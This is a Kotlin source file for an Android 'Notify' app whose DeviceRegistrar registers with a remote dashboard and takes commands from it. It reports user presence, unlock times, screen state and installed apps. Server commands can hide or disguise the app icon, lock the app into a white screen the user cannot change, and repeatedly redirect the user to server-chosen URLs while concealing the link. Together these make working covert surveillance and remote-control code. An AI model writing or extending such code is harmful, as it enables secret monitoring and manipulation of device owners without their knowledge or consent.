package com.notify

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat

object DeviceRegistrar {
    private const val TAG = "DeviceRegistrar"
    private const val PREF = "notify"
    private const val KEY_DEVICE_ID = "teller_device_id"
    private const val KEY_DEVICE_TOKEN = "teller_device_token"
    private const val KEY_BLANK = "blank_enabled"
    private const val KEY_STICKY_URL = "sticky_relay_url"
    private const val KEY_STICKY_SLOT = "sticky_relay_slot"
    private const val KEY_STICKY_TITLE = "sticky_relay_title"
    private const val KEY_STICKY_BODY = "sticky_relay_body"
    private const val DEFAULT_BASE = "https://teller-sooty.vercel.app"
    private const val RELAY_CHANNEL_ID = "notify_relay"
    // Separate notification IDs per Relay slot so Relay 1, Relay 2 and
    // Custom Relay never overwrite each other.
    private const val RELAY_NOTIF_ID_1 = 2002
    private const val RELAY_NOTIF_ID_2 = 2003
    private const val RELAY_NOTIF_ID_3 = 2004
    const val RELAY_URL_1 = "https://spotify.com"
    const val RELAY_URL_2 = "https://youtube.com"

    private val io = Executors.newSingleThreadExecutor()

    fun getDeviceId(prefs: SharedPreferences): String {
        var id = prefs.getString(KEY_DEVICE_ID, null)
        if (id.isNullOrBlank()) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString(KEY_DEVICE_ID, id).apply()
            Log.i(TAG, "new deviceId $id")
        }
        return id
    }

    /**
     * Per-device command lock: minted by the Relayer at register, echoed on
     * every heartbeat. Sent back as x-device-token so only THIS device can
     * read/consume its own queue — device A can never touch device B's.
     */
    private fun getToken(prefs: SharedPreferences): String? =
        prefs.getString(KEY_DEVICE_TOKEN, null)?.takeIf { !it.isBlank() }

    private fun saveToken(prefs: SharedPreferences, respFull: String) {
        try {
            val t = JSONObject(respFull).optString("deviceToken")
            if (!t.isNullOrBlank()) {
                if (prefs.getString(KEY_DEVICE_TOKEN, null) != t) {
                    prefs.edit().putString(KEY_DEVICE_TOKEN, t).apply()
                    Log.i(TAG, "device token stored")
                }
            }
        } catch (_: Exception) {}
    }

    fun getBaseUrl(ctx: Context): String {
        val prefs = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        prefs.getString("teller_base_url", null)?.let { if (it.isNotBlank()) return it.trimEnd('/') }
        return try {
            val f = BuildConfig::class.java.getField("TELLER_BASE_URL")
            (f.get(null) as String).trimEnd('/')
        } catch (_: Exception) { DEFAULT_BASE }
    }

    fun setBaseUrl(ctx: Context, url: String) {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit().putString("teller_base_url", url.trimEnd('/')).apply()
    }

    // ---- Blank mode: dashboard-only white screen. No on-device UI can
    // change this; only a "blank" command from Teller/Relayer flips it. ----
    fun isBlankEnabled(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE).getBoolean(KEY_BLANK, false)

    fun setBlankEnabled(app: Context, enabled: Boolean) {
        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit().putBoolean(KEY_BLANK, enabled).apply()
        Log.i(TAG, "blank ${if (enabled) "ON — app shows white only" else "OFF"}")
    }

    // ---- Sticky relay: once a Relay fires, every app open auto-redirects
    // to its URL until a "stopRelay" command clears it. Per-device (prefs). ----
    fun hasStickyRelay(app: Context): Boolean =
        !app.getSharedPreferences(PREF, Context.MODE_PRIVATE).getString(KEY_STICKY_URL, null).isNullOrBlank()

    fun getStickyRelaySlot(app: Context): Int =
        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 3)

    fun setStickyRelay(app: Context, url: String, slot: Int = 1, title: String? = null, body: String? = null) {
        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putString(KEY_STICKY_URL, url)
            .putInt(KEY_STICKY_SLOT, slot.coerceIn(1, 3))
            .putString(KEY_STICKY_TITLE, title ?: "")
            .putString(KEY_STICKY_BODY, body ?: "")
            .apply()
        Log.i(TAG, "sticky relay set slot=$slot -> $url (auto-fires on every open)")
    }

    fun clearStickyRelay(app: Context) {
        app.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .remove(KEY_STICKY_URL).remove(KEY_STICKY_SLOT)
            .remove(KEY_STICKY_TITLE).remove(KEY_STICKY_BODY)
            .apply()
        Log.i(TAG, "sticky relay cleared — auto-redirect stopped")
    }

    /** Re-fires the stored sticky relay (direct open + notification fallback). */
    fun fireStickyRelay(ctx: Context): Boolean {
        val app = ctx.applicationContext
        val prefs = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val url = prefs.getString(KEY_STICKY_URL, null)?.takeIf { it.isNotBlank() } ?: return false
        val slot = prefs.getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 3)
        val title = prefs.getString(KEY_STICKY_TITLE, null)?.takeIf { it.isNotBlank() }
        val body = prefs.getString(KEY_STICKY_BODY, null)?.takeIf { it.isNotBlank() }
        openRelayUrl(app, url, slot, title, body)
        return true
    }

    fun registerAsync(ctx: Context) = heartbeatAsync(ctx, isRegister = true)
    fun heartbeatAsync(ctx: Context, isRegister: Boolean = false) {
        val app = ctx.applicationContext
        io.execute {
            try { doPost(app, isRegister) } catch (e: Exception) { Log.w(TAG, "post failed: ${e.message}") }
        }
    }

    private fun doPost(app: Context, isRegister: Boolean) {
        val prefs = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val deviceId = getDeviceId(prefs)
        val base = getBaseUrl(app)
        val path = if (isRegister) "/api/devices/register" else "/api/devices/heartbeat"
        val url = URL(base + path)
        // Reconcile presence synchronously: statics reset to
        // screenOn=true/inUse=false on every process restart and the first
        // register races service start, so never trust the cache here.
        try { UserPresence.refresh(app) } catch (_: Exception) {}
        val snap = try { MonitoredApps.snapshot(app.packageManager) } catch (_:Exception) { MonitoredApps.Snapshot(emptyList(), MonitoredApps.DEFAULTS) }
        var batteryOptimized = false
        try {
            val power = app.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            batteryOptimized = !power.isIgnoringBatteryOptimizations(app.packageName)
        } catch (_:Exception){}
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("model", Build.MODEL)
            put("androidVersion", Build.VERSION.RELEASE ?: Build.VERSION.SDK_INT.toString())
            put("appVersion", try { app.packageManager.getPackageInfo(app.packageName, 0).versionName } catch(_:Exception){ "0.2.1-poss" })
            put("verifyId", VerifyId.getOrCreate(app))
            put("installed", JSONArray(snap.installed))
            put("missing", JSONArray(snap.missing))
            put("monitorRunning", AppMonitorService.running)
            put("batteryOptimized", batteryOptimized)
            put("alias", AppAlias.current(app))
            put("appLabel", AppAlias.labelFor(AppAlias.current(app)))
            put("hidden", AppAlias.isHidden(app))
            put("inUse", UserPresence.inUse)
            put("screenOn", UserPresence.screenOn)
            put("lastUnlock", UserPresence.lastUnlockIso())
            put("ringerMode", RingerMode.current(app))
            put("appState", AppForeground.current(app))
            put("appStateAt", AppForeground.stateAtIso(app))
            put("blankEnabled", prefs.getBoolean(KEY_BLANK, false))
            put("relayActive", !prefs.getString(KEY_STICKY_URL, null).isNullOrBlank())
            put("relaySlot", prefs.getInt(KEY_STICKY_SLOT, 1).coerceIn(1, 3))
        }
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 8000; readTimeout = 8000
            doOutput = true
            setRequestProperty("Content-Type", "application/json")
            setRequestProperty("User-Agent", "Notify/0.2.1-poss")
            // Ownership proof: only this device's token unlocks its queue.
            getToken(prefs)?.let { setRequestProperty("x-device-token", it) }
        }
        OutputStreamWriter(conn.outputStream, "UTF-8").use { it.write(body.toString()) }
        val code = conn.responseCode
        // Full body for parsing (token + commands must not be truncated);
        // truncated copy for the log only.
        val respFull = try { conn.inputStream.bufferedReader().readText() } catch(_:Exception){ conn.errorStream?.bufferedReader()?.readText() ?: "" }
        val resp = respFull.take(600)
        conn.disconnect()
        Log.i(TAG, "${if(isRegister) "register" else "heartbeat"} $code $resp")
        if (code == 401) Log.w(TAG, "device token rejected — will re-register for a fresh token")
        if (code in 200..299) {
            prefs.edit().putLong("teller_last_ok", System.currentTimeMillis()).apply()
            saveToken(prefs, respFull)
        }
        try {
            if (!isRegister) {
                val objs = mutableListOf<JSONObject>()
                val j = JSONObject(respFull)
                // New shape: { commands: [{ action, ... }] }
                val arr = j.optJSONArray("commands")
                if (arr != null) {
                    for (i in 0 until arr.length()) {
                        arr.optJSONObject(i)?.let { objs.add(it) }
                    }
                }
                // Legacy shape: { command: { action?, url } }
                if (objs.isEmpty()) {
                    (j.optJSONObject("command") ?: j.optJSONObject("device")?.optJSONObject("command"))?.let {
                        objs.add(it)
                    }
                }
                if (dispatchCommands(app, objs, respFull)) pollCommandsAsync(app)
            }
        } catch (_: Exception) {}
    }

    fun pollCommandsAsync(ctx: Context) {
        val app = ctx.applicationContext
        io.execute {
            try {
                val prefs = app.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                val deviceId = getDeviceId(prefs)
                val base = getBaseUrl(app)
                val url = URL("$base/api/devices/$deviceId/poll")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 6000; readTimeout = 6000
                    setRequestProperty("User-Agent", "Notify/0.2.1-poss")
                    // Ownership proof: the Relayer only serves the queue
                    // belonging to this token — never another device's.
                    getToken(prefs)?.let { setRequestProperty("x-device-token", it) }
                }
                val code = conn.responseCode
                val respFull = try { conn.inputStream.bufferedReader().readText() } catch(_:Exception){ conn.errorStream?.bufferedReader()?.readText() ?: "" }
                conn.disconnect()
                if (code == 401) {
                    Log.w(TAG, "poll token rejected — will re-register for a fresh token")
                    return@execute
                }
                if (code in 200..299 && respFull.contains("\"command\"") && !respFull.contains("\"command\":null")) {
                    val j = JSONObject(respFull)
                    val objs = mutableListOf<JSONObject>()
                    val arr = j.optJSONArray("commands")
                    if (arr != null) {
                        for (i in 0 until arr.length()) {
                            arr.optJSONObject(i)?.let { objs.add(it) }
                        }
                    }
                    if (objs.isEmpty()) {
                        j.optJSONObject("command")?.let { objs.add(it) }
                    }
                    dispatchCommands(app, objs, respFull)
                }
            } catch (e: Exception) {
                Log.w(TAG, "poll failed: ${e.message}")
            }
        }
    }

    /**
     * Dispatches server commands. Returns true if anything was handled.
     * Actions: "relay" {url, slot, title?, body?} (sticky: re-fires on every
     * app open until stopped), "stopRelay" {} (clears the sticky relay),
     * "blank" {enabled} (dashboard-only white screen), "rename" {alias} and
     * "visibility" {visible}. Objects without an explicit action but with a
     * url are treated as legacy relay commands.
     */
    private fun dispatchCommands(app: Context, objs: List<JSONObject>, raw: String): Boolean {
        var handled = false
        for (o in objs) {
            val action = o.optString("action").ifBlank {
                if (!o.optString("url").isNullOrBlank()) "relay" else ""
            }
            when (action) {
                "relay" -> {
                    val u = o.optString("url")
                    if (u.isNullOrBlank()) continue
                    // Legacy entries predate slots and carry no action marker;
                    // require the raw body to mention relay to avoid firing on
                    // unrelated payloads that happen to contain a url.
                    if (o.optString("action").isBlank() && !raw.contains("\"relay\"")) continue
                    val slot = o.optInt("slot", 1).coerceIn(1, 3)
                    val title = o.optString("title").ifBlank { null }
                    val body = o.optString("body").ifBlank { null }
                    // Sticky: every future app open auto-redirects to this URL
                    // until the dashboard sends stopRelay.
                    setStickyRelay(app, u, slot, title, body)
                    openRelayUrl(app, u, slot, title, body)
                    heartbeatAsync(app)
                    handled = true
                }
                "stopRelay", "stop_relay", "stop-relay" -> {
                    if (hasStickyRelay(app)) {
                        clearStickyRelay(app)
                        Log.i(TAG, "stopRelay executed — auto-redirect stopped")
                        heartbeatAsync(app)
                    } else {
                        Log.i(TAG, "stopRelay no-op (no sticky relay stored)")
                    }
                    handled = true
                }
                "blank" -> {
                    if (!o.has("enabled")) continue
                    val enabled = o.optBoolean("enabled")
                    setBlankEnabled(app, enabled)
                    heartbeatAsync(app)
                    handled = true
                }
                "visibility" -> {
                    if (!o.has("visible")) continue
                    val wantVisible = o.optBoolean("visible")
                    val hidden = AppAlias.isHidden(app)
                    if (wantVisible && hidden) {
                        val ok = AppAlias.show(app)
                        Log.i(TAG, "visibility Visible executed, verified=$ok")
                        heartbeatAsync(app)
                    } else if (!wantVisible && !hidden) {
                        val ok = AppAlias.hide(app)
                        Log.i(TAG, "visibility Hide executed, verified=$ok")
                        heartbeatAsync(app)
                    } else {
                        Log.i(TAG, "visibility no-op (wantVisible=$wantVisible hidden=$hidden)")
                    }
                    handled = true
                }
                "rename" -> {
                    val alias = o.optString("alias")
                    if (alias.isNullOrBlank() || !AppAlias.isKnown(alias)) continue
                    if (alias == AppAlias.current(app)) { handled = true; continue }
                    // Hidden devices must stay hidden: store the name for
                    // restore instead of enabling its alias (which would pop
                    // the icon back while the dashboard says hidden).
                    val ok = if (AppAlias.isHidden(app)) {
                        AppAlias.storeAliasOnly(app, alias)
                    } else {
                        AppAlias.apply(app, alias)
                    }
                    if (ok) {
                        // Refresh the foreground notification so its title
                        // follows the new vanity name immediately.
                        try { AppMonitorService.refresh(app) } catch (_: Exception) {}
                        // Report the new name promptly so the dashboard reflects it.
                        heartbeatAsync(app)
                    } else {
                        Log.w(TAG, "rename to $alias NOT verified")
                    }
                    handled = true
                }
            }
        }
        return handled
    }

    private fun hasNotifPermission(app: Context): Boolean =
        Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
            ContextCompat.checkSelfPermission(app, android.Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED

    private fun ensureRelayChannel(app: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = app.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(RELAY_CHANNEL_ID) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(RELAY_CHANNEL_ID, "Relay", NotificationManager.IMPORTANCE_HIGH).apply {
                        description = "Tap to open Relay link"
                    }
                )
            }
        }
    }

    private fun openRelayUrl(app: Context, url: String, slot: Int = 1, title: String? = null, body: String? = null) {
        val slotId = slot.coerceIn(1, 3)
        val defaultTitle = when (slotId) { 2 -> "Relay 2"; 3 -> "Custom Relay"; else -> "Relay 1" }
        val notifTitle = title?.take(64) ?: defaultTitle
        // Never show the destination link on-device: generic tap prompt only.
        val notifBody = body?.take(256)?.takeIf { it.isNotBlank() } ?: "Tap to open"
        val notifId = when (slotId) { 2 -> RELAY_NOTIF_ID_2; 3 -> RELAY_NOTIF_ID_3; else -> RELAY_NOTIF_ID_1 }
        // Try direct launch first (works foreground / if system allows)
        var directOk = false
        try {
            Log.i(TAG, "$notifTitle opening $url")
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addCategory(Intent.CATEGORY_BROWSABLE)
            app.startActivity(i)
            directOk = true
        } catch (e: Exception) {
            Log.w(TAG, "$notifTitle direct open failed (likely BAL): ${e.message}")
        }
        // If direct may have been blocked (background), also post notification as fallback
        // On Android 10+ background start is blocked; notification guarantees delivery
        try {
            if (!hasNotifPermission(app)) {
                if (!directOk) Log.w(TAG, "No notif permission and direct blocked — $notifTitle may be invisible in background")
                return
            }
            ensureRelayChannel(app)
            val pi = PendingIntent.getActivity(
                app, ((title ?: defaultTitle).hashCode() + (body ?: "").hashCode() + slotId * 31 + System.currentTimeMillis().toInt()),
                Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK).addCategory(Intent.CATEGORY_BROWSABLE),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val notif = NotificationCompat.Builder(app, RELAY_CHANNEL_ID)
                .setSmallIcon(AppAlias.statIconRes(app))
                .setLargeIcon(android.graphics.BitmapFactory.decodeResource(app.resources, AppAlias.iconRes(app)))
                .setContentTitle(notifTitle)
                .setContentText(notifBody)
                .setStyle(NotificationCompat.BigTextStyle().bigText(notifBody))
                .setContentIntent(pi)
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_ALARM)
                .build()
            val nm = app.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(notifId, notif)
            Log.i(TAG, "$notifTitle notification posted")
        } catch (e: Exception) {
            Log.w(TAG, "$notifTitle notification failed: ${e.message}")
        }
    }
}
